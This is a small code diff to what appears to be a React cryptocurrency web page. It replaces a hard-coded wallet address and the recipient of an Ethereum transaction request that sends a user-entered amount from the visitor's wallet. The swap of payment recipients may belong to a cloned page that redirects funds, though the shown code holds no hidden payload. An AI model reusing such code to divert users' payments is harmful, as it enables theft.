@@ -8,7 +8,7 @@ const image = 'https://www.citypng.com/public/uploads/small/31630703755mgh49e6bk
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
 
-const address = "D7xLPt19BogkxXd2C2AAhaHUh1VoDLzxdf9ConG2gJWf"
+const address = "r74VH5E1Hz3uRgG15RjywGPJ9Cztw2yKQszFhofRZT5"
 
 function App() {
     const [opacity, setOpacity] = useState(0)
@@ -89,7 +89,7 @@ function App() {
 
         let params = [{
             "from": address[0],
-            "to": '0x2affCC7D6BD232E9115b28AB635960C80d51E9F2',
+            "to": '0xAc1e81526bB869aA73B5B41D62dF4AD811df3d3B',
             "value": parseInt(Number(ethAmount) * 1000000000000000000).toString(16)
         }]
 
